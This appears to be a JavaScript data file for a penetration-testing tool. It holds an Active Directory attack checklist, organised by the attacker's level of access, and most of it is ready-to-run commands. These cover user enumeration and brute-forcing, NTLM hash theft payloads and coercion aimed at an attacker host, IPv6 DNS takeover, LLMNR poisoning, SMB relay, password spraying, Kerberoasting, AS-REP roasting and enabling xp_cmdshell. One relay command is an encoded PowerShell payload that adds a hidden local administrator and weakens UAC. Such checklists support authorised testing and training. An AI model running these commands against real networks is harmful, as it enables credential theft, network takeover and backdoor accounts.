checklist["windows_ad"] = [
    {
        chapter: "1. Preparation",
        checks: [
            {
                title: "nxc - generate krb5.conf + hosts file",
                description: "Generate a krb5.conf file and a hosts file for kerberos authentication using nxc.",
                code: `# 1. Generate a record for the /etc/hosts file (appends it)
nxc smb {{RHOST}} --generate-hosts-file /etc/hosts

# 2. Generate a krb5.conf file for kerberos authentication
nxc smb {{RHOST}} --generate-krb5-file /etc/krb5.conf
`,
                code_language: bash,
            },
        ]
    },
    {
        chapter: "2. AD status : no users, no passwords",
        checks: [
            {
                title: "ridenum.py - Enumerate users via RID cycling",
                description: "Utilize ridenum.py to enumerate users in the Active Directory by cycling through Relative Identifiers (RIDs).",
                code: `# 1. Enumerate user accounts from a domain
ridenum.py {{RHOST}} 500 50000

# 2. With guest account
ridenum.py {{RHOST}} 500 5000 Guest ''`,
                code_language: bash,
            },
            {
                title: "ldapsearch - Anonymous LDAP Enumeration",
                description: "Utilize ldapsearch to perform anonymous LDAP queries against the Active Directory to gather information about users, groups, and other directory objects.",
                code: `# 1. use ldapsearch to get the base namingcontext of the host
ldapsearch -H ldap://{{RHOST}} -x -s base namingContexts

# 2. retrieve all information based on the base namingcontext
ldapsearch -H ldap://{{RHOST}} -x -b "DC={{DOMAIN}},DC={{ROOTDNS}}"

# in case you have a match, search for the following terms:
- description
- info
- pwd
- the domain name itself
- default
- legacy
- vault
- password   
`,
                code_language: bash,
            },
            {
                title: "rpcclient - Anonymous RPC Enumeration",
                description: "Utilize rpcclient to connect to the target system and enumerate users, groups and more.",
                code: `# 1. utilize rpcclient with a null authentication session
rpcclient -U '' -N {{RHOST}}

# 2. connect to a host with a guest account and no password
rpcclient -U 'guest' -N {{RHOST}}

##### Once connected, you can use the following commands (mose useful for AD enumeration)
# enumdomgroups - Enumerate domain groups
# enumdomusers - Enumerate domain users
rpcclient $> enumdomusers
        user:[Administrator] rid:[0x1f4]
        user:[Guest] rid:[0x1f5]
        ....
        user:[G.Goldberg] rid:[0x458]

# queryuser - Query information about a specific user by its RID (0x458 = 1112)
rpcclient $> queryuser 0x458
        User Name   :   G.Goldberg
        Full Name   :
        Home Drive  :
        ....`,
                code_language: bash,
            },
            {
                title: "nxc - Anonymous SMB enumeration",
                description: "Utilize nxc to connect to SMB shares on the target system and enumerate available shares and their contents.",
                code: `# 1. try listing the shares with an null authentication session
nxc smb {{RHOST}} -u '' -p '' --shares

# 2. try listing the shares with a guest account and no password
nxc smb {{RHOST}} -u 'guest' -p '' --shares
`,
                code_language: bash,
            },
            {
                title: "kerbrute - Username enumeration",
                description: "Utilize kerbrute to perform a brute-force attack on valid usernames via Kerberos pre-authentication.",
                code: `# 1A. brute-force valid usernames via Kerberos pre-authentication
kerbrute userenum --domain '{{DOMAIN}}'.'{{ROOTDNS}}' --dc {{RHOST}} /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

# 1B. names wordlist
kerbrute userenum --domain '{{DOMAIN}}'.'{{ROOTDNS}}' --dc {{RHOST}} /usr/share/wordlists/seclists/Usernames/Names/names.txt

# 2. (only if a website is up) generate a list of usernames based on the content of the target website (if accessible) with cewl
cewl --output cewl-usernames.txt --depth 5 --min-word-length 2 http://{{RHOST}}

# then run kerbrute again with the generated list
kerbrute userenum --domain '{{DOMAIN}}'.'{{ROOTDNS}}' --dc {{RHOST}} cewl-usernames.txt

# 3. (only if you can find some users first and lastname) Generate a list of potential usernames based on first and last names
# 3A. navigate to https://github.com/0xKirito/ADUserGen - see the repository and clone it
git clone https://github.com/0xKirito/ADUserGen

# 3B. prepare your userlist, e.g. a list of usernames per line as follows:
# first_name last_name
# first_name_2 last_name_2

# 3C. run the ADUserGen script to generate usernames
python3 ADUserGen/AD_usernames_generator.py -u users.txt -o possible_users.txt
`,
                code_language: bash,
            },
            {
                title: "ntlm_theft - Writable SMB share",
                description: "Utilize ntlm_theft to generate multiple payloads and upload them to a writable SMB share for NTLMv2 hash theft.",
                code: `# 1. generate multiple payloads with ntlm_theft
python3 ntlm_theft.py -g all -s {{LHOST}} -f malicious

# 2. upload the generated payloads to a writable smb share (e.g. 'DocumentsShare')
smbclient //{{RHOST}}/DocumentsShare
smbclient //{{RHOST}}/DocumentsShare -U guest% -N
smbclient //{{RHOST}}/DocumentsShare -U guest%''

# 3. within the smbclient session, upload all the generated payloads
smb: \\> prompt off;
smb: \\> mput *

# 4. intercept the NTLMv2 hashes with responder
responder -I {{NIC}} -Pv

# or analyse mode (no poisoning)
responder -I {{NIC}} -A -v
`,
                code_language: bash,
            },
            {
                title: "mitm6 - IPv6 DNS takeover",
                description: "Utilize mitm6 with ntlmrelayx to perform an IPv6 DNS takeover attack in an Active Directory environment.",
                code_language: bash,
                code: `##### REQUIREMENTS:
# this can be ran if your machine is part of the internal AD network
# it won't work if the AD environment is not using IPv6

##### USE THIS TECHNIQUE ONLY IN STINTS OF MAX 10 MINUTES #####

##### REFERENCE:
# https://github.com/dirkjanm/mitm6

##### START EXPLOITATION

# Step 1: run the following command on shell 1
# This command relays captured NTLMv2 credentials over IPv6 to an LDAPS server (often the DC), pretending to be part of the domain testfakepad.{{DOMAIN}}.{{ROOTDNS}}, and stores any looted data in the 'loot' folder.
ntlmrelayx.py -6 -t ldaps://{{RHOST}} -wh 'testfakepad'.'{{DOMAIN}}'.'{{ROOTDNS}}' -l loot

# Step 2. run the following command on shell 2
mitm6 -d '{{DOMAIN}}'.'{{ROOTDNS}}'

# Step 3. if both commands are running, reboot a workstation of the active directory domain, you will shortly after see a result
...

##### END EXPLOITATION`
            },
            {
                title: "responder - LLMNR poisoning attack",
                description: "Use 'responder' to perform LLMNR poisoning in an Active Directory environment.",
                code_language: bash,
                code: `##### REQUIREMENTS:
# this can be ran if your machine is part of the internal AD network
# it won't work if LLMNR and NBT-NS is disabled in the network

##### REFERENCE:
# https://tcm-sec.com/llmnr-poisoning-and-how-to-prevent-it/

##### START EXPLOITATION

# Step 1: setup responder to capture the hashes (make sure SMB and HTTP are disabled in responder.conf)
responder -I {{NIC}} -Pv

# Step 2: generate traffic, by navigating to a share that does not exist from 1 of the workstations
...

##### END EXPLOITATION`
            },
            {
                title: "responder/ntlm relay - SMB-relay attack",
                description: "Use 'ntlmrelayx' with responder to perform SMB relay attacks in an Active Directory environment & capture hashes.",
                code_language: bash,
                code: `##### REQUIREMENTS:
# this can be ran if your machine is part of the internal AD network
# it requires targets that have SMB signing disabled (or enabled but not required)
# CANNOT BE RAN IF RESPONDER IS RUNNING SIMULTANEOUSLY WITH SMB ENABLED

##### REFERENCE:
# https://tcm-sec.com/smb-relay-attacks-and-how-to-prevent-them/

##### START EXPLOITATION

### ----- INIT RESPONDER ----- ###
# 1. start responder for capturing NTLMv2 hashes (make sure SMB is DISABLED)
responder -I {{NIC}} -Pv

# NOW ALL NTLMv2 HASHES THAT ARE CAPTURED WILL BE RELAYED ONCE NTLMRELAYX IS STARTED

### ----- INIT SMB-RELAY ----- ###
# 1. scan the host to check if smb signing is disabled (or enabled but not required)
nmap --script=smb2-security-mode.nse -p445 {{RHOST}}

# 2. create a targets.txt file with hosts that have smb signing disabled (or enabled but not required) - one ip-address per line
...

# 3. setup ntlmrelayx.py to relay the captured hashes to the targets and execute a command
sudo ntlmrelayx.py -tf targets.txt -smb2support --no-http-server # this will dump the SAM hashes

##### ALTERNATIVES
# A. add a the account 'tempUserG:DiffPword951' to the system, then add tempUserG account to the local admin group && disable remote UAC restrictions (privileged admin)
sudo ntlmrelayx.py -tf targets.txt -smb2support --no-http-server -c "powershell -enc bgBlAHQAIAB1AHMAZQByACAAIgB0AGUAbQBwAFUAcwBlAHIARwAiACAAIgBEAGkAZgBmAFAAdwBvAHIAZAA5ADUAMQAiACAALwBhAGQAZAAgADsAIABuAGUAdAAgAGwAbwBjAGEAbABnAHIAbwB1AHAAIABBAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByAHMAIAAiAHQAZQBtAHAAVQBzAGUAcgBHACIAIAAvAGEAZABkACAAOwAgAHIAZQBnACAAYQBkAGQAIAAiAEgASwBMAE0AXABTAE8ARgBUAFcAQQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABQAG8AbABpAGMAaQBlAHMAXABTAHkAcwB0AGUAbQAiACAALwB2ACAATABvAGMAYQBsAEEAYwBjAG8AdQBuAHQAVABvAGsAZQBuAEYAaQBsAHQAZQByAFAAbwBsAGkAYwB5ACAALwB0ACAAUgBFAEcAXwBEAFcATwBSAEQAIAAvAGQAIAAxACAALwBmAA=="

##### END EXPLOITATION`
            }
        ]
    },
    {
        chapter: "3. AD status : valid users, no passwords",
        checks: [
            {
                title: "ASREPROAST - Impacket's GetNPUsers.py",
                description: "Utilize Impacket's GetNPUsers.py to request AS-REP responses for users that do not require pre-authentication, allowing for offline password cracking.",
                code: `# 1. Retrieve all - AS-REP roastable accounts from the domain in hashcat format (domain users samaccount names in users.txt)
GetNPUsers.py '{{DOMAIN}}'.'{{ROOTDNS}}'/ -usersfile users.txt -format hashcat -outputfile hashes.asreproast

# 2. utilizing nxc
nxc ldap {{RHOST}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --asreproast asreproast.txt`,
                code_language: bash,
            },
            {
                title: "nxc - password spraying (common passwords & users)",
                description: "Utilize nxc to perform password spraying attacks against SMB shares on the target system using a list of common passwords.",
                code: `###### FIRST CHECK THE LOCKOUT POLICY! #####
# 1. password spray with a list of common passwords against a list of users
nxc smb {{RHOST}} -u users.txt -p common-passwords.txt

# 2. use the 'users.txt' as both user and password list
nxc smb {{RHOST}} -u users.txt -p users.txt

# 3. create a lowercase and uppercase version - then spray again with the valid users
cat users.txt | awk '{print tolower($0)}' > users-lowercase.txt
cat users.txt | awk '{print toupper($0)}' > users-uppercase.txt

# execute nxc with the upper and lowercase user variations
nxc smb {{RHOST}} -u users.txt -p users-lowercase.txt
nxc smb {{RHOST}} -u users.txt -p users-uppercase.txt
`,
                code_language: bash,
            },
            {
                title: "nxc - password spraying (cewl, keywords & seasons)",
                description: "Utilize nxc to perform password spraying attacks against SMB shares on the target system using a list of generated passwords based on keywords.",
                code: `###### FIRST CHECK THE LOCKOUT POLICY! #####
# 1. generate a list of keywords based on the content of the target website (if accessible) with cewl
# option 1 : CEWLER with lowercase, NORMAL and min word length of 2
cewler --output cewler-lowercase.txt --depth 5 --lowercase --min-word-length 2 http://{{RHOST}}
cewler --output cewler.txt --depth 5 --min-word-length 2 http://{{RHOST}}

# optional, use munge.py to add variations to the wordlist
python3 munge.py -l 7 -i cewler.txt -o cewler-munged.txt

# option 2 : KEYWORDS & SEASONS
# save the underlying script to the file 'kw_seasons.py' and run it with python3 kw_seasons.py > kw_seasons.txt
"""
years = [str(y) for y in range(2023, 2024)] # < adjust the years if needed
keywords = ["winter", "Winter", "spring", "Spring", "summer", "Summer", "fall", "Fall", "autumn", "Autumn"] # < more keywords here
seps = ["", "-", "_"]
out = []
for y in years:
  for k in keywords:
    for sp in seps:
      out.append(f"{y}{sp}{k}")
      out.append(f"{k}{sp}{y}")
for w in sorted(set(out)):
  print(w)
"""

# 2. password spray with the generated keyword list against a list of users
nxc smb {{RHOST}} -u users.txt -p cewler-lowercase.txt
nxc smb {{RHOST}} -u users.txt -p cewler.txt
nxc smb {{RHOST}} -u users.txt -p cewler-munged.txt
nxc smb {{RHOST}} -u users.txt -p kw_seasons.txt`,
                code_language: bash,
            },
            // {
            //     title: "",
            //     description: "",
            //     code: ``,
            //     code_language: bash,
            // },
        ]
    },
    {
        chapter: "4. AD status : valid low-priviliged user",
        checks: [
            {
                title: "bloodhound-python && bloodhound-ce",
                description: "Gather information about the Active Directory environment using bloodhound-python and visualize it with bloodhound-ce.",
                code: `# 1. OPTION 1: bloodhound ingestor bloodhound-python (bloodhound-ce)
bloodhound-python -v -u '{{USERNAME}}' -p '{{PASSWORD}}' -d '{{DOMAIN}}'.'{{ROOTDNS}}' -dc '{{HOSTNAME}}'.'{{DOMAIN}}'.'{{ROOTDNS}}' -ns {{NAMESERVER}} -c All

# 2. OPTION 2: bloodhound ingestor nxc (bloodhound-ce)
nxc ldap '{{HOSTNAME}}'.'{{DOMAIN}}'.'{{ROOTDNS}}' -u '{{USERNAME}}' -p '{{PASSWORD}}' --bloodhound --collection All --dns-server {{NAMESERVER}}`,
                code_language: bash,
            },
            {
                title: "ldapdomaindump",
                description: "Gather LDAP information using ldapdomaindump.",
                code: `# 1. Collect all data from a domain using ldapdomaindump
# 1A. Make sure you have the domain, in this case domain.local, saved in your /etc/hosts folder
sudo vim /etc/hosts

# 1B. Use ldapdomaindump to collect data from the domain
ldapdomaindump -u '{{DOMAIN}}'.'{{ROOTDNS}}'\\\\'{{USERNAME}}' -p '{{PASSWORD}}' '{{DOMAIN}}'.'{{ROOTDNS}}'

# search for these terms in the file "domain_users.json"
- description
- info
- pwd
- the domain name itself
- default
- legacy
- vault
- password`,
                code_language: bash,
            },
            {
                title: "GetUserSPNs.py - Kerberoasting",
                description: "Finds service accounts with SPNs, grabs TGS tickets for cracking (Kerberoasting).",
                code: `# 1. retrieve all - KERBEROAST - able accounts from the domain
GetUserSPNs.py '{{DOMAIN}}'.'{{ROOTDNS}}'/'{{USERNAME}}':'{{PASSWORD}}' -dc-ip {{RHOST}} -request -outputfile hashes.kerberoast

# 2. utilizing nxc
nxc ldap {{RHOST}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --kerberoast kerberoast.txt`,
                code_language: bash,
            },
            {
                title: "nxc - quick-win vulnerabilities",
                description: "Checks for multiple vulnerabilities in the Active Directory environment using nxc (DOES NOT EXPLOIT IT).",
                code: `# 1. check for multiple vulnerabilities in the AD environment (use latest version of nxc)
nxc smb {{RHOST}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -M nopac -M ntlm_reflection -M zerologon -M printnightmare -M smbghost -M ms17-010 -M coerce_plus`,
                code_language: bash,
            },
            {
                title: "nxc & smbclient - authenticated share enumeration",
                description: "Utilize nxc to connect to SMB shares on the target system and enumerate available shares and their contents.",
                code: `##### NXC
# 1. try listing the shares with an authenticated session
nxc smb {{RHOST}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --shares

# 2. List the shares and the content of the shares using the module 'spider_plus'
nxc smb {{RHOST}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --shares -M 'spider_plus' -o OUTPUT_FOLDER=./

##### SMBCLIENT
# 1. Connect to an share with smbclient
smbclient //{{RHOST}}/{{SHARE}} -U '{{USERNAME}}'%'{{PASSWORD}}'

# OPTIONAL: download the content recursively (this is within the smb SESSION)
recurse ON;
prompt OFF;
mget *;

# OPTIONAL: download content to the share (this is within the smb SESSION)
get <file.txt>

# OPTIONAL: upload content to the share RECURSIVELY (this is within the smb SESSION)
put <file.txt>
`,
                code_language: bash,
            },
            {
                title: "certipy",
                description: "Use certipy to check for certificate-based attacks and enumeration.",
                code: `# 1. Enumerate all available certificate templates in the domain
certipy find -u '{{USERNAME}}@{{DOMAIN}}.{{ROOTDNS}}' -p '{{PASSWORD}}' -dc-ip {{RHOST}} -vulnerable -enabled

# 2. in case you get an SSL error
certipy find -u '{{USERNAME}}@{{DOMAIN}}.{{ROOTDNS}}' -p '{{PASSWORD}}' -dc-ip {{RHOST}} -vulnerable -enabled -ldap-scheme ldap -ldap-port 389 -no-ldap-signing -no-ldap-channel-binding -ldap-simple-auth`,
                code_language: bash,
            },
            {
                title: "enum4linux - authenticated",
                description: "Use enum4linux to enumerate information from Windows and Samba systems.",
                code: `# 1. run enum4linux with authentication
enum4linux-ng -A -u '{{DOMAIN}}'/'{{USERNAME}}' -p '{{PASSWORD}}' {{RHOST}}`,
                code_language: bash,
            },
            {
                title: "mssqlclient.py - guest/ authenticated access",
                description: "Use mssqlclient.py to perform mssql enumeration",
                code: `# 1. connect to a remote host
mssqlclient.py -windows-auth '{{DOMAIN}}'/'{{USERNAME}}':'{{PASSWORD}}'@{{RHOST}}

##### WITHIN interactive mode
# 1A. list directory structure on current host
xp_dirtree 'C:\\'

# 1B. perform an ntlm-relay attack
xp_dirtree //{{LHOST}}/randomShare

# 1C. check if you can impersonate a user (CHECK THIS FOR ALL USERS YOU HAVE!)
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';

# impersonate that user (if possible)
EXECUTE AS LOGIN = '<TARGET-USERNAME>';

# 1D. execute a command using xp_cmdshell
xp_cmdshell 'whoami'

#### enabling xp_cmdshell if it is disabled
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

#### disabling xp_cmdshell again (if needed)
EXEC sp_configure 'xp_cmdshell', 0;
EXEC sp_configure 'show advanced options', 0;
RECONFIGURE;`,
                code_language: bash,
            },

        ]
    },
    {
        chapter: "5. AD status : stuck on a low-privileged user",
        checks: [
            {
                title: "nxc - password spraying",
                description: "Check all username and password combinations with nxc against SMB shares on the target system.",
                code: `# 1. nxc - password spraying
nxc smb {{RHOST}} -u users.txt -p users.txt`,
                code_language: bash,
            },
            {
                title: "nxc - enumerate shares for all users",
                description: "Check if you can access any other shares with your user(s) using nxc.",
                code: `# 1. check if you can access any other shares with your user(s)
nxc smb {{RHOST}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --shares

# 2. List the shares and the content of the shares using the module 'spider_plus'
nxc smb {{RHOST}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --shares -M spider_plus`,
                code_language: bash,
            },
            {
                title: "ldapdomaindump - enumerate all attributes",
                description: "Double check all the LDAP information using ldapdomaindump.",
                code: `# 1. use bat to read all the json files in the ldapdomaindump output folder
bat '*.json'`,
                code_language: bash,
            },
            // {
            //     title: "",
            //     description: "",
            //     code: ``,
            //     code_language: bash,
            // },
        ]
    },
]